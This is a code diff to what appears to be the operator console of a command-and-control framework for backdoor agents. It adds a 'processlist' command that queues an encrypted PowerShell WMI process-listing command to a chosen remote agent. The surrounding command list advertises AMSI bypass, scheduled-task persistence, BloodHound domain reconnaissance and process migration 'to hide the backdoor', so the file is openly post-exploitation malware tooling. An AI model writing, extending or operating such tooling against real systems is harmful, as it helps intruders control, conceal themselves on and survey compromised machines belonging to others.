@@ -53,7 +53,8 @@ class cmd:
      'dis_amsi',
      'unamanged_powershell',
      'persist_schtasks',
-     'migrate']
+     'migrate',
+     'processlist']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -86,7 +87,8 @@ class cmd:
      ['bloodhound', 'run bloodhound to collect all the information about the AD'],
      ['unamanged_powershell', 'run powershell payload through the dotnet agent'],
      ['persist_schtasks', 'persistence using schedule tasks'],
-     ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor ']]
+     ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor '],
+     ['processlist', 'list processes formated ( Name , ID , Commandline)']]
 
     def help(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
@@ -471,3 +473,10 @@ class cmd:
         output.write(temp)
         output.close()
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Migrator.ps1"))
+
+    def processlist(self, args=None):
+        if config.get_pointer()=='main':
+            print ("you can't use this command in main ! chose an agent")
+            return
+
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Get-WmiObject Win32_Process  | select Name,ProcessId,CommandLine | Format-Table -Wrap -AutoSize"))
